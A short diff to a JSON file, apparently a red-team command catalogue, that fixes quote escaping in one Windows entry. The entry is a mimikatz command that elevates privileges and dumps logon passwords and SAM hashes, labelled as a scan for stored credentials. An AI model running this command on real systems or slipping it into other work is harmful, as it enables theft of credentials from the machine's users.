@@ -169,7 +169,7 @@
     },
     {
       "os": "Windows",
-      "cmd": "./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"",
+      "cmd": "./mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"exit\"",
       "description": "Perform scans for stored creds and hashes."
     }
   ],
